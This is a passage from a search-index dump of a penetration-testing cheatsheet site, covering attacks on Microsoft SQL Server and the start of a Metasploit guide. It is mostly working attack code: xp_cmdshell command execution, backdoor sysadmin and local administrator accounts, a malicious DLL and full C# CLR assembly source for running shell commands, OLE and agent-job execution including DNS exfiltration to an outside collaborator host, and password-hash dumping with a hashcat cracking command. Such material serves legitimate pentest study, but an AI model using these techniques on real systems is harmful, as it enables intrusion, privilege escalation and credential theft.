Execution via xp_cmdshell</li> <li>Extended Stored Procedure<ul> <li>Add the extended stored procedure and list extended stored procedures</li> </ul> </li> <li>CLR Assemblies<ul> <li>Execute commands using CLR assembly</li> <li>Manually creating a CLR DLL and importing it</li> </ul> </li> <li>OLE Automation<ul> <li>Execute commands using OLE automation procedures</li> </ul> </li> <li>Agent Jobs<ul> <li>Execute commands through SQL Agent Job service</li> <li>List All Jobs</li> </ul> </li> <li>External Scripts<ul> <li>Python</li> <li>R</li> </ul> </li> <li>Audit Checks<ul> <li>Find and exploit impersonation opportunities </li> </ul> </li> <li>Find databases that have been configured as trustworthy</li> <li>Manual SQL Server Queries<ul> <li>Query Current User &amp; determine if the user is a sysadmin</li> <li>Current Role</li> <li>Current DB</li> <li>List all tables</li> <li>List all databases</li> <li>All Logins on Server</li> <li>All Database Users for a Database </li> <li>List All Sysadmins</li> <li>List All Database Roles</li> <li>Effective Permissions from the Server</li> <li>Effective Permissions from the Database</li> <li>Find SQL Server Logins Which can be Impersonated for the Current Database</li> <li>Exploiting Impersonation</li> <li>Exploiting Nested Impersonation</li> <li>MSSQL Accounts and Hashes</li> </ul> </li> <li>References</li> </ul>"},{"location":"Methodology%20and%20Resources/MSSQL%20Server%20-%20Cheatsheet/#tools","title":"Tools","text":"<ul> <li>NetSPI/PowerUpSQL - A PowerShell Toolkit for Attacking SQL Server</li> <li>skahwah/SQLRecon - A C# MS SQL toolkit designed for offensive reconnaissance and post-exploitation.</li> </ul>"},{"location":"Methodology%20and%20Resources/MSSQL%20Server%20-%20Cheatsheet/#identify-instances-and-databases","title":"Identify Instances and Databases","text":""},{"location":"Methodology%20and%20Resources/MSSQL%20Server%20-%20Cheatsheet/#discover-local-sql-server-instances","title":"Discover Local SQL Server Instances","text":"<pre><code>Get-SQLInstanceLocal\n</code></pre>"},{"location":"Methodology%20and%20Resources/MSSQL%20Server%20-%20Cheatsheet/#discover-domain-sql-server-instances","title":"Discover Domain SQL Server Instances","text":"<pre><code>Get-SQLInstanceDomain -Verbose\n# Get Server Info for Found Instances\nGet-SQLInstanceDomain | Get-SQLServerInfo -Verbose\n# Get Database Names\nGet-SQLInstanceDomain | Get-SQLDatabase -NoDefaults\n</code></pre>"},{"location":"Methodology%20and%20Resources/MSSQL%20Server%20-%20Cheatsheet/#discover-remote-sql-server-instances","title":"Discover Remote SQL Server Instances","text":"<pre><code>Get-SQLInstanceBroadcast -Verbose\nGet-SQLInstanceScanUDPThreaded -Verbose -ComputerName SQLServer1\n</code></pre>"},{"location":"Methodology%20and%20Resources/MSSQL%20Server%20-%20Cheatsheet/#identify-encrypted-databases","title":"Identify Encrypted databases","text":"<p>Note: These are automatically decrypted for admins</p> <pre><code>Get-SQLDatabase -Username sa -Password Password1234 -Instance \"&lt;DBSERVERNAME\\DBInstance&gt;\" -Verbose | Where-Object {$_.is_encrypted -eq \"True\"}\n</code></pre>"},{"location":"Methodology%20and%20Resources/MSSQL%20Server%20-%20Cheatsheet/#version-query","title":"Version Query","text":"<pre><code>Get-SQLInstanceDomain | Get-Query \"select @@version\"\n</code></pre>"},{"location":"Methodology%20and%20Resources/MSSQL%20Server%20-%20Cheatsheet/#identify-sensitive-information","title":"Identify Sensitive Information","text":""},{"location":"Methodology%20and%20Resources/MSSQL%20Server%20-%20Cheatsheet/#get-tables-from-a-specific-database","title":"Get Tables from a Specific Database","text":"<pre><code>Get-SQLInstanceDomain | Get-SQLTable -DatabaseName &lt;DBNameFromGet-SQLDatabaseCommand&gt; -NoDefaults\nGet Column Details from a Table\nGet-SQLInstanceDomain | Get-SQLColumn -DatabaseName &lt;DBName&gt; -TableName &lt;TableName&gt;\n</code></pre>"},{"location":"Methodology%20and%20Resources/MSSQL%20Server%20-%20Cheatsheet/#gather-5-entries-from-each-column","title":"Gather 5 Entries from Each Column","text":"<pre><code>Get-SQLInstanceDomain | Get-SQLColumnSampleData -Keywords \"&lt;columnname1,columnname2,columnname3,columnname4,columnname5&gt;\" -Verbose -SampleSize 5\n</code></pre>"},{"location":"Methodology%20and%20Resources/MSSQL%20Server%20-%20Cheatsheet/#gather-5-entries-from-a-specific-table","title":"Gather 5 Entries from a Specific Table","text":"<pre><code>Get-SQLQuery -Instance \"&lt;DBSERVERNAME\\DBInstance&gt;\" -Query 'select TOP 5 * from &lt;DatabaseName&gt;.dbo.&lt;TableName&gt;'\n</code></pre>"},{"location":"Methodology%20and%20Resources/MSSQL%20Server%20-%20Cheatsheet/#dump-common-information-from-server-to-files","title":"Dump common information from server to files","text":"<pre><code>Invoke-SQLDumpInfo -Verbose -Instance SQLSERVER1\\Instance1 -csv\n</code></pre>"},{"location":"Methodology%20and%20Resources/MSSQL%20Server%20-%20Cheatsheet/#linked-database","title":"Linked Database","text":""},{"location":"Methodology%20and%20Resources/MSSQL%20Server%20-%20Cheatsheet/#find-trusted-link","title":"Find Trusted Link","text":"<pre><code>select * from master..sysservers\n</code></pre>"},{"location":"Methodology%20and%20Resources/MSSQL%20Server%20-%20Cheatsheet/#execute-query-through-the-link","title":"Execute Query Through The Link","text":"<pre><code>-- execute query through the link\nselect * from openquery(\"dcorp-sql1\", 'select * from master..sysservers')\nselect version from openquery(\"linkedserver\", 'select @@version as version');\n-- chain multiple openquery\nselect version from openquery(\"link1\",'select version from openquery(\"link2\",\"select @@version as version\")')\n-- execute shell commands\nEXECUTE('sp_configure ''xp_cmdshell'',1;reconfigure;') AT LinkedServer\nselect 1 from openquery(\"linkedserver\",'select 1;exec master..xp_cmdshell \"dir c:\"')\n-- create user and give admin privileges\nEXECUTE('EXECUTE(''CREATE LOGIN hacker WITH PASSWORD = ''''P@ssword123.'''' '') AT \"DOMINIO\\SERVER1\"') AT \"DOMINIO\\SERVER2\"\nEXECUTE('EXECUTE(''sp_addsrvrolemember ''''hacker'''' , ''''sysadmin'''' '') AT \"DOMINIO\\SERVER1\"') AT \"DOMINIO\\SERVER2\"\n</code></pre>"},{"location":"Methodology%20and%20Resources/MSSQL%20Server%20-%20Cheatsheet/#crawl-links-for-instances-in-the-domain","title":"Crawl Links for Instances in the Domain","text":"<p>A Valid Link Will Be Identified by the DatabaseLinkName Field in the Results</p> <pre><code>Get-SQLInstanceDomain | Get-SQLServerLink -Verbose\nselect * from master..sysservers\n</code></pre>"},{"location":"Methodology%20and%20Resources/MSSQL%20Server%20-%20Cheatsheet/#crawl-links-for-a-specific-instance","title":"Crawl Links for a Specific Instance","text":"<pre><code>Get-SQLServerLinkCrawl -Instance \"&lt;DBSERVERNAME\\DBInstance&gt;\" -Verbose\nselect * from openquery(\"&lt;instance&gt;\",'select * from openquery(\"&lt;instance2&gt;\",''select * from master..sysservers'')')\n</code></pre>"},{"location":"Methodology%20and%20Resources/MSSQL%20Server%20-%20Cheatsheet/#query-version-of-linked-database","title":"Query Version of Linked Database","text":"<pre><code>Get-SQLQuery -Instance \"&lt;DBSERVERNAME\\DBInstance&gt;\" -Query \"select * from openquery(`\"&lt;DBSERVERNAME\\DBInstance&gt;`\",'select @@version')\" -Verbose\n</code></pre>"},{"location":"Methodology%20and%20Resources/MSSQL%20Server%20-%20Cheatsheet/#execute-procedure-on-linked-database","title":"Execute Procedure on Linked Database","text":"<pre><code>SQL&gt; EXECUTE('EXEC sp_configure ''show advanced options'',1') at \"linked.database.local\";\nSQL&gt; EXECUTE('RECONFIGURE') at \"linked.database.local\";\nSQL&gt; EXECUTE('EXEC sp_configure ''xp_cmdshell'',1;') at \"linked.database.local\";\nSQL&gt; EXECUTE('RECONFIGURE') at \"linked.database.local\";\nSQL&gt; EXECUTE('exec xp_cmdshell whoami') at \"linked.database.local\";\n</code></pre>"},{"location":"Methodology%20and%20Resources/MSSQL%20Server%20-%20Cheatsheet/#determine-names-of-linked-databases","title":"Determine Names of Linked Databases","text":"<p>tempdb, model ,and msdb are default databases usually not worth looking into. Master is also default but may have something and anything else is custom and definitely worth digging into. The result is DatabaseName which feeds into following query.</p> <pre><code>Get-SQLQuery -Instance \"&lt;DBSERVERNAME\\DBInstance&gt;\" -Query \"select * from openquery(`\"&lt;DatabaseLinkName&gt;`\",'select name from sys.databases')\" -Verbose\n</code></pre>"},{"location":"Methodology%20and%20Resources/MSSQL%20Server%20-%20Cheatsheet/#determine-all-the-tables-names-from-a-selected-linked-database","title":"Determine All the Tables Names from a Selected Linked Database","text":"<p>The result is TableName which feeds into following query</p> <pre><code>Get-SQLQuery -Instance \"&lt;DBSERVERNAME\\DBInstance&gt;\" -Query \"select * from openquery(`\"&lt;DatabaseLinkName&gt;`\",'select name from &lt;DatabaseNameFromPreviousCommand&gt;.sys.tables')\" -Verbose\n</code></pre>"},{"location":"Methodology%20and%20Resources/MSSQL%20Server%20-%20Cheatsheet/#gather-the-top-5-columns-from-a-selected-linked-table","title":"Gather the Top 5 Columns from a Selected Linked Table","text":"<p>The results are ColumnName and ColumnValue which feed into following query</p> <pre><code>Get-SQLQuery -Instance \"&lt;DBSERVERNAME\\DBInstance&gt;\" -Query \"select * from openquery(`\"&lt;DatabaseLinkName&gt;`\",'select TOP 5 * from &lt;DatabaseNameFromPreviousCommand&gt;.dbo.&lt;TableNameFromPreviousCommand&gt;')\" -Verbose\n</code></pre>"},{"location":"Methodology%20and%20Resources/MSSQL%20Server%20-%20Cheatsheet/#gather-entries-from-a-selected-linked-column","title":"Gather Entries from a Selected Linked Column","text":"<pre><code>Get-SQLQuery -Instance \"&lt;DBSERVERNAME\\DBInstance&gt;\" -Query \"select * from openquery(`\"&lt;DatabaseLinkName&gt;`\"'select * from &lt;DatabaseNameFromPreviousCommand&gt;.dbo.&lt;TableNameFromPreviousCommand&gt; where &lt;ColumnNameFromPreviousCommand&gt;=&lt;ColumnValueFromPreviousCommand&gt;')\" -Verbose\n</code></pre>"},{"location":"Methodology%20and%20Resources/MSSQL%20Server%20-%20Cheatsheet/#command-execution-via-xp_cmdshell","title":"Command Execution via xp_cmdshell","text":"<p>xp_cmdshell disabled by default since SQL Server 2005</p> <pre><code>PowerUpSQL&gt; Invoke-SQLOSCmd -Username sa -Password Password1234 -Instance \"&lt;DBSERVERNAME\\DBInstance&gt;\" -Command whoami\n# Creates and adds local user backup to the local administrators group:\nPowerUpSQL&gt; Invoke-SQLOSCmd -Username sa -Password Password1234 -Instance \"&lt;DBSERVERNAME\\DBInstance&gt;\" -Command \"net user backup Password1234 /add'\" -Verbose\nPowerUpSQL&gt; Invoke-SQLOSCmd -Username sa -Password Password1234 -Instance \"&lt;DBSERVERNAME\\DBInstance&gt;\" -Command \"net localgroup administrators backup /add\" -Verbose\n</code></pre> <ul> <li>Manually execute the SQL query     <pre><code>EXEC xp_cmdshell \"net user\";\nEXEC master..xp_cmdshell 'whoami'\nEXEC master.dbo.xp_cmdshell 'cmd.exe dir c:';\nEXEC master.dbo.xp_cmdshell 'ping 127.0.0.1';\n</code></pre></li> <li>If you need to reactivate xp_cmdshell (disabled by default in SQL Server 2005)     <pre><code>EXEC sp_configure 'show advanced options',1;\nRECONFIGURE;\nEXEC sp_configure 'xp_cmdshell',1;\nRECONFIGURE;\n</code></pre></li> <li>If the procedure was uninstalled     <pre><code>sp_addextendedproc 'xp_cmdshell','xplog70.dll'\n</code></pre></li> </ul>"},{"location":"Methodology%20and%20Resources/MSSQL%20Server%20-%20Cheatsheet/#extended-stored-procedure","title":"Extended Stored Procedure","text":""},{"location":"Methodology%20and%20Resources/MSSQL%20Server%20-%20Cheatsheet/#add-the-extended-stored-procedure-and-list-extended-stored-procedures","title":"Add the extended stored procedure and list extended stored procedures","text":"<pre><code># Create evil DLL\nCreate-SQLFileXpDll -OutFile C:\\temp\\test.dll -Command \"echo test &gt; c:\\temp\\test.txt\" -ExportName xp_test\n# Load the DLL and call xp_test\nGet-SQLQuery -UserName sa -Password Password1234 -Instance \"&lt;DBSERVERNAME\\DBInstance&gt;\" -Query \"sp_addextendedproc 'xp_test', '\\\\10.10.0.1\\temp\\test.dll'\"\nGet-SQLQuery -UserName sa -Password Password1234 -Instance \"&lt;DBSERVERNAME\\DBInstance&gt;\" -Query \"EXEC xp_test\"\n# Listing existing\nGet-SQLStoredProcedureXP -Instance \"&lt;DBSERVERNAME\\DBInstance&gt;\" -Verbose\n</code></pre> <ul> <li>Build a DLL using xp_evil_template.cpp</li> <li>Load the DLL     <pre><code>-- can also be loaded from UNC path or Webdav\nsp_addextendedproc 'xp_calc', 'C:\\mydll\\xp_calc.dll'\nEXEC xp_calc\nsp_dropextendedproc 'xp_calc'\n</code></pre></li> </ul>"},{"location":"Methodology%20and%20Resources/MSSQL%20Server%20-%20Cheatsheet/#clr-assemblies","title":"CLR Assemblies","text":"<p>Prerequisites: * sysadmin privileges * CREATE ASSEMBLY permission (or) * ALTER ASSEMBLY permission (or)</p> <p>The execution takes place with privileges of the service account.</p>"},{"location":"Methodology%20and%20Resources/MSSQL%20Server%20-%20Cheatsheet/#execute-commands-using-clr-assembly","title":"Execute commands using CLR assembly","text":"<pre><code># Create C# code for the DLL, the DLL and SQL query with DLL as hexadecimal string\nCreate-SQLFileCLRDll -ProcedureName \"runcmd\" -OutFile runcmd -OutDir C:\\Users\\user\\Desktop\n# Execute command using CLR assembly\nInvoke-SQLOSCmdCLR -Username sa -Password &lt;password&gt; -Instance &lt;instance&gt; -Command \"whoami\" -Verbose\nInvoke-SQLOSCmdCLR -Username sa -Password Password1234 -Instance \"&lt;DBSERVERNAME\\DBInstance&gt;\" -Command \"whoami\" Verbose\nInvoke-SQLOSCmdCLR -Username sa -Password Password1234 -Instance \"&lt;DBSERVERNAME\\DBInstance&gt;\" -Command \"powershell -e &lt;base64&gt;\" -Verbose\n# List all the stored procedures added using CLR\nGet-SQLStoredProcedureCLR -Instance &lt;instance&gt; -Verbose\n</code></pre>"},{"location":"Methodology%20and%20Resources/MSSQL%20Server%20-%20Cheatsheet/#manually-creating-a-clr-dll-and-importing-it","title":"Manually creating a CLR DLL and importing it","text":"<p>Create a C# DLL file with the following content, with the command : <code>C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe /target:library c:\\temp\\cmd_exec.cs</code></p> <pre><code>using System;\nusing System.Data;\nusing System.Data.SqlClient;\nusing System.Data.SqlTypes;\nusing Microsoft.SqlServer.Server;\nusing System.IO;\nusing System.Diagnostics;\nusing System.Text;\npublic partial class StoredProcedures\n{\n[Microsoft.SqlServer.Server.SqlProcedure]\npublic static void cmd_exec (SqlString execCommand)\n{\nProcess proc = new Process();\nproc.StartInfo.FileName = @\"C:\\Windows\\System32\\cmd.exe\";\nproc.StartInfo.Arguments = string.Format(@\" /C {0}\", execCommand.Value);\nproc.StartInfo.UseShellExecute = false;\nproc.StartInfo.RedirectStandardOutput = true;\nproc.Start();\n// Create the record and specify the metadata for the columns.\nSqlDataRecord record = new SqlDataRecord(new SqlMetaData(\"output\", SqlDbType.NVarChar, 4000));\n// Mark the beginning of the result set.\nSqlContext.Pipe.SendResultsStart(record);\n// Set values for each column in the row\nrecord.SetString(0, proc.StandardOutput.ReadToEnd().ToString());\n// Send the row back to the client.\nSqlContext.Pipe.SendResultsRow(record);\n// Mark the end of the result set.\nSqlContext.Pipe.SendResultsEnd();\nproc.WaitForExit();\nproc.Close();\n}\n};\n</code></pre> <p>Then follow these instructions:</p> <ol> <li>Enable <code>show advanced options</code> on the server     <pre><code>sp_configure 'show advanced options',1; RECONFIGURE\nGO\n</code></pre></li> <li>Enable CLR on the server     <pre><code>sp_configure 'clr enabled',1\nRECONFIGURE\nGO\n</code></pre></li> <li>Import the assembly     <pre><code>CREATE ASSEMBLY my_assembly\nFROM 'c:\\temp\\cmd_exec.dll'\nWITH PERMISSION_SET = UNSAFE;\n</code></pre></li> <li>Link the assembly to a stored procedure     <pre><code>CREATE PROCEDURE [dbo].[cmd_exec] @execCommand NVARCHAR (4000) AS EXTERNAL NAME [my_assembly].[StoredProcedures].[cmd_exec];\nGO\n</code></pre></li> <li>Execute and clean     <pre><code>cmd_exec \"whoami\"\nDROP PROCEDURE cmd_exec\nDROP ASSEMBLY my_assembly\n</code></pre></li> </ol> <p>CREATE ASSEMBLY will also accept an hexadecimal string representation of a CLR DLL</p> <pre><code>CREATE ASSEMBLY [my_assembly] AUTHORIZATION [dbo] FROM 0x4D5A90000300000004000000F[TRUNCATED]\nWITH PERMISSION_SET = UNSAFE GO </code></pre>"},{"location":"Methodology%20and%20Resources/MSSQL%20Server%20-%20Cheatsheet/#ole-automation","title":"OLE Automation","text":"<ul> <li> Disabled by default</li> <li>The execution takes place with privileges of the service account.</li> </ul>"},{"location":"Methodology%20and%20Resources/MSSQL%20Server%20-%20Cheatsheet/#execute-commands-using-ole-automation-procedures","title":"Execute commands using OLE automation procedures","text":"<pre><code>Invoke-SQLOSCmdOle -Username sa -Password Password1234 -Instance \"&lt;DBSERVERNAME\\DBInstance&gt;\" -Command \"whoami\" Verbose\n</code></pre> <pre><code># Enable OLE Automation\nEXEC sp_configure 'show advanced options', 1\nEXEC sp_configure reconfigure\nEXEC sp_configure 'OLE Automation Procedures', 1\nEXEC sp_configure reconfigure\n# Execute commands\nDECLARE @execmd INT\nEXEC SP_OACREATE 'wscript.shell', @execmd OUTPUT\nEXEC SP_OAMETHOD @execmd, 'run', null, '%systemroot%\\system32\\cmd.exe /c'\n</code></pre> <pre><code># https://github.com/blackarrowsec/mssqlproxy/blob/master/mssqlclient.py\npython3 mssqlclient.py 'host/username:password@10.10.10.10' -install -clr Microsoft.SqlServer.Proxy.dll\npython3 mssqlclient.py 'host/username:password@10.10.10.10' -check -reciclador 'C:\\windows\\temp\\reciclador.dll'\npython3 mssqlclient.py 'host/username:password@10.10.10.10' -start -reciclador 'C:\\windows\\temp\\reciclador.dll'\nSQL&gt; enable_ole\nSQL&gt; upload reciclador.dll C:\\windows\\temp\\reciclador.dll\n</code></pre>"},{"location":"Methodology%20and%20Resources/MSSQL%20Server%20-%20Cheatsheet/#agent-jobs","title":"Agent Jobs","text":"<ul> <li>The execution takes place with privileges of the SQL Server Agent service account if a proxy account is not configured.</li> <li> Require sysadmin or SQLAgentUserRole, SQLAgentReaderRole, and SQLAgentOperatorRole roles to create a job.</li> </ul>"},{"location":"Methodology%20and%20Resources/MSSQL%20Server%20-%20Cheatsheet/#execute-commands-through-sql-agent-job-service","title":"Execute commands through SQL Agent Job service","text":"<pre><code>Invoke-SQLOSCmdAgentJob -Subsystem PowerShell -Username sa -Password Password1234 -Instance \"&lt;DBSERVERNAME\\DBInstance&gt;\" -Command \"powershell e &lt;base64encodedscript&gt;\" -Verbose\nSubsystem Options:\n\u2013Subsystem CmdExec\n-SubSystem PowerShell\n\u2013Subsystem VBScript\n\u2013Subsystem Jscript\n</code></pre> <pre><code>USE msdb; EXEC dbo.sp_add_job @job_name = N'test_powershell_job1'; EXEC sp_add_jobstep @job_name = N'test_powershell_job1', @step_name = N'test_powershell_name1', @subsystem = N'PowerShell', @command = N'$name=$env:COMPUTERNAME[10];nslookup \"$name.redacted.burpcollaborator.net\"', @retry_attempts = 1, @retry_interval = 5 ;\nEXEC dbo.sp_add_jobserver @job_name = N'test_powershell_job1'; EXEC dbo.sp_start_job N'test_powershell_job1';\n-- delete\nEXEC dbo.sp_delete_job @job_name = N'test_powershell_job1';\n</code></pre>"},{"location":"Methodology%20and%20Resources/MSSQL%20Server%20-%20Cheatsheet/#list-all-jobs","title":"List All Jobs","text":"<pre><code>SELECT job_id, [name] FROM msdb.dbo.sysjobs;\nSELECT job.job_id, notify_level_email, name, enabled, description, step_name, command, server, database_name FROM msdb.dbo.sysjobs job INNER JOIN msdb.dbo.sysjobsteps steps ON job.job_id = steps.job_id\nGet-SQLAgentJob -Instance \"&lt;DBSERVERNAME\\DBInstance&gt;\" -username sa -Password Password1234 -Verbose\n</code></pre>"},{"location":"Methodology%20and%20Resources/MSSQL%20Server%20-%20Cheatsheet/#external-scripts","title":"External Scripts","text":"<p> You need to enable external scripts.</p> <pre><code>sp_configure 'external scripts enabled', 1;\nRECONFIGURE;\n</code></pre>"},{"location":"Methodology%20and%20Resources/MSSQL%20Server%20-%20Cheatsheet/#python","title":"Python:","text":"<pre><code>Invoke-SQLOSCmdPython -Username sa -Password Password1234 -Instance \"&lt;DBSERVERNAME\\DBInstance&gt;\" -Command \"powershell -e &lt;base64encodedscript&gt;\" -Verbose\nEXEC sp_execute_external_script @language =N'Python',@script=N'import subprocess p = subprocess.Popen(\"cmd.exe /c whoami\", stdout=subprocess.PIPE) OutputDataSet = pandas.DataFrame([str(p.stdout.read(), \"utf-8\")])'\nWITH RESULT SETS (([cmd_out] nvarchar(max)))\n</code></pre>"},{"location":"Methodology%20and%20Resources/MSSQL%20Server%20-%20Cheatsheet/#r","title":"R","text":"<pre><code>Invoke-SQLOSCmdR -Username sa -Password Password1234 -Instance \"&lt;DBSERVERNAME\\DBInstance&gt;\" -Command \"powershell -e &lt;base64encodedscript&gt;\" -Verbose\nEXEC sp_execute_external_script @language=N'R',@script=N'OutputDataSet &lt;- data.frame(system(\"cmd.exe /c dir\",intern=T))'\nWITH RESULT SETS (([cmd_out] text));\nGO\n@script=N'OutputDataSet &lt;-data.frame(shell(\"dir\",intern=T))'\n</code></pre>"},{"location":"Methodology%20and%20Resources/MSSQL%20Server%20-%20Cheatsheet/#audit-checks","title":"Audit Checks","text":""},{"location":"Methodology%20and%20Resources/MSSQL%20Server%20-%20Cheatsheet/#find-and-exploit-impersonation-opportunities","title":"Find and exploit impersonation opportunities","text":"<ul> <li>Impersonate as: <code>EXECUTE AS LOGIN = 'sa'</code></li> <li>Impersonate <code>dbo</code> with DB_OWNER     <pre><code>SQL&gt; select is_member('db_owner');\nSQL&gt; execute as user = 'dbo'\nSQL&gt; SELECT is_srvrolemember('sysadmin')\n</code></pre></li> </ul> <pre><code>Invoke-SQLAuditPrivImpersonateLogin -Username sa -Password Password1234 -Instance \"&lt;DBSERVERNAME\\DBInstance&gt;\" -Exploit -Verbose\n# impersonate sa account\npowerpick Get-SQLQuery -Instance \"&lt;DBSERVERNAME\\DBInstance&gt;\" -Query \"EXECUTE AS LOGIN = 'sa'; SELECT IS_SRVROLEMEMBER(''sysadmin'')\" -Verbose -Debug\n</code></pre>"},{"location":"Methodology%20and%20Resources/MSSQL%20Server%20-%20Cheatsheet/#find-databases-that-have-been-configured-as-trustworthy","title":"Find databases that have been configured as trustworthy","text":"<pre><code>Invoke-SQLAuditPrivTrustworthy -Instance \"&lt;DBSERVERNAME\\DBInstance&gt;\" -Exploit -Verbose SELECT name as database_name, SUSER_NAME(owner_sid) AS database_owner, is_trustworthy_on AS TRUSTWORTHY from sys.databases\n</code></pre> <p>The following audit checks run web requests to load Inveigh via reflection. Be mindful of the environment and ability to connect outbound.</p> <pre><code>Invoke-SQLAuditPrivXpDirtree\nInvoke-SQLUncPathInjection\nInvoke-SQLAuditPrivXpFileexist\n</code></pre>"},{"location":"Methodology%20and%20Resources/MSSQL%20Server%20-%20Cheatsheet/#manual-sql-server-queries","title":"Manual SQL Server Queries","text":""},{"location":"Methodology%20and%20Resources/MSSQL%20Server%20-%20Cheatsheet/#query-current-user-determine-if-the-user-is-a-sysadmin","title":"Query Current User &amp; determine if the user is a sysadmin","text":"<pre><code>select suser_sname()\nSelect system_user\nselect is_srvrolemember('sysadmin')\n</code></pre>"},{"location":"Methodology%20and%20Resources/MSSQL%20Server%20-%20Cheatsheet/#current-role","title":"Current Role","text":"<pre><code>Select user\n</code></pre>"},{"location":"Methodology%20and%20Resources/MSSQL%20Server%20-%20Cheatsheet/#current-db","title":"Current DB","text":"<pre><code>select db_name()\n</code></pre>"},{"location":"Methodology%20and%20Resources/MSSQL%20Server%20-%20Cheatsheet/#list-all-tables","title":"List all tables","text":"<pre><code>select table_name from information_schema.tables\n</code></pre>"},{"location":"Methodology%20and%20Resources/MSSQL%20Server%20-%20Cheatsheet/#list-all-databases","title":"List all databases","text":"<pre><code>select name from master..sysdatabases\n</code></pre>"},{"location":"Methodology%20and%20Resources/MSSQL%20Server%20-%20Cheatsheet/#all-logins-on-server","title":"All Logins on Server","text":"<pre><code>Select * from sys.server_principals where type_desc != 'SERVER_ROLE'\n</code></pre>"},{"location":"Methodology%20and%20Resources/MSSQL%20Server%20-%20Cheatsheet/#all-database-users-for-a-database","title":"All Database Users for a Database","text":"<pre><code>Select * from sys.database_principals where type_desc != 'database_role';\n</code></pre>"},{"location":"Methodology%20and%20Resources/MSSQL%20Server%20-%20Cheatsheet/#list-all-sysadmins","title":"List All Sysadmins","text":"<pre><code>SELECT name,type_desc,is_disabled FROM sys.server_principals WHERE IS_SRVROLEMEMBER ('sysadmin',name) = 1\n</code></pre>"},{"location":"Methodology%20and%20Resources/MSSQL%20Server%20-%20Cheatsheet/#list-all-database-roles","title":"List All Database Roles","text":"<pre><code>SELECT DB1.name AS DatabaseRoleName,\nisnull (DB2.name, 'No members') AS DatabaseUserName\nFROM sys.database_role_members AS DRM\nRIGHT OUTER JOIN sys.database_principals AS DB1\nON DRM.role_principal_id = DB1.principal_id\nLEFT OUTER JOIN sys.database_principals AS DB2\nON DRM.member_principal_id = DB2.principal_id\nWHERE DB1.type = 'R'\nORDER BY DB1.name;\n</code></pre>"},{"location":"Methodology%20and%20Resources/MSSQL%20Server%20-%20Cheatsheet/#effective-permissions-from-the-server","title":"Effective Permissions from the Server","text":"<pre><code>select * from fn_my_permissions(null, 'server');\n</code></pre>"},{"location":"Methodology%20and%20Resources/MSSQL%20Server%20-%20Cheatsheet/#effective-permissions-from-the-database","title":"Effective Permissions from the Database","text":"<pre><code>SELECT * FROM fn_dp1my_permissions(NULL, 'DATABASE');\n</code></pre>"},{"location":"Methodology%20and%20Resources/MSSQL%20Server%20-%20Cheatsheet/#find-sql-server-logins-which-can-be-impersonated-for-the-current-database","title":"Find SQL Server Logins Which can be Impersonated for the Current Database","text":"<pre><code>select distinct b.name\nfrom sys.server_permissions a\ninner join sys.server_principals b\non a.grantor_principal_id = b.principal_id\nwhere a.permission_name = 'impersonate'\n</code></pre>"},{"location":"Methodology%20and%20Resources/MSSQL%20Server%20-%20Cheatsheet/#exploiting-impersonation","title":"Exploiting Impersonation","text":"<pre><code>SELECT SYSTEM_USER\nSELECT IS_SRVROLEMEMBER('sysadmin')\nEXECUTE AS LOGIN = 'adminuser'\nSELECT SYSTEM_USER\nSELECT IS_SRVROLEMEMBER('sysadmin')\nSELECT ORIGINAL_LOGIN()\n</code></pre>"},{"location":"Methodology%20and%20Resources/MSSQL%20Server%20-%20Cheatsheet/#exploiting-nested-impersonation","title":"Exploiting Nested Impersonation","text":"<pre><code>SELECT SYSTEM_USER\nSELECT IS_SRVROLEMEMBER('sysadmin')\nEXECUTE AS LOGIN = 'stduser'\nSELECT SYSTEM_USER\nEXECUTE AS LOGIN = 'sa'\nSELECT IS_SRVROLEMEMBER('sysadmin')\nSELECT ORIGINAL_LOGIN()\nSELECT SYSTEM_USER\n</code></pre>"},{"location":"Methodology%20and%20Resources/MSSQL%20Server%20-%20Cheatsheet/#mssql-accounts-and-hashes","title":"MSSQL Accounts and Hashes","text":"<pre><code>MSSQL 2000:\nSELECT name, password FROM master..sysxlogins\nSELECT name, master.dbo.fn_varbintohexstr(password) FROM master..sysxlogins (Need to convert to hex to return hashes in MSSQL error message / some version of query analyzer.)\nMSSQL 2005\nSELECT name, password_hash FROM master.sys.sql_logins\nSELECT name + '-' + master.sys.fn_varbintohexstr(password_hash) from master.sys.sql_logins\n</code></pre> <p>Then crack passwords using Hashcat : <code>hashcat -m 1731 -a 0 mssql_hashes_hashcat.txt /usr/share/wordlists/rockyou.txt --force</code></p> <pre><code>131 MSSQL (2000)    0x01002702560500000000000000000000000000000000000000008db43dd9b1972a636ad0c7d4b8c515cb8ce46578\n132 MSSQL (2005)    0x010018102152f8f28c8499d8ef263c53f8be369d799f931b2fbe\n1731    MSSQL (2012, 2014)  0x02000102030434ea1b17802fd95ea6316bd61d2c94622ca3812793e8fb1672487b5c904a45a31b2ab4a78890d563d2fcf5663e46fe797d71550494be50cf4915d3f4d55ec375\n</code></pre>"},{"location":"Methodology%20and%20Resources/MSSQL%20Server%20-%20Cheatsheet/#references","title":"References","text":"<ul> <li>PowerUpSQL Cheat Sheet &amp; SQL Server Queries - Leo Pitt</li> <li>PowerUpSQL Cheat Sheet - Scott Sutherland</li> <li>Attacking SQL Server CLR Assemblies - Scott Sutherland - July 13th, 2017</li> <li>MSSQL Agent Jobs for Command Execution - Nicholas Popovich - September 21, 2016</li> </ul>"},{"location":"Methodology%20and%20Resources/Metasploit%20-%20Cheatsheet/","title":"Metasploit","text":""},{"location":"Methodology%20and%20Resources/Metasploit%20-%20Cheatsheet/#summary","title":"Summary","text":"<ul> <li>Installation</li> <li>Sessions</li> <li>Background handler</li> <li>Meterpreter - Basic<ul> <li>Generate a meterpreter</li> <li>Meterpreter Webdelivery</li> <li>Get System</li> <li>Persistence Startup</li> <li>Network Monitoring</li> <li>Portforward</li> <li>Upload / Download</li> <li>Execute from Memory</li> <li>Mimikatz</li> <li>Pass the Hash - PSExec</li> <li>Use SOCKS Proxy</li> </ul> </li> <li>Scripting Metasploit</li> <li>Multiple transports</li> <li>Best of - Exploits</li> <li>References</li> </ul>"},{"location":"Methodology%20and%20Resources/Metasploit%20-%20Cheatsheet/#installation","title":"Installation","text":"<pre><code>curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &gt; msfinstall &amp;&amp; chmod 755 msfinstall &amp;&amp; ./msfinstall\n</code></pre>"},{"location":"Methodology%20and%20Resources/Metasploit%20-%20Cheatsheet/#sessions","title":"Sessions","text":"<pre><code>CTRL+Z   -&gt; Session in Background\nsessions -&gt; List sessions\nsessions -i session_number -&gt; Interact with Session with 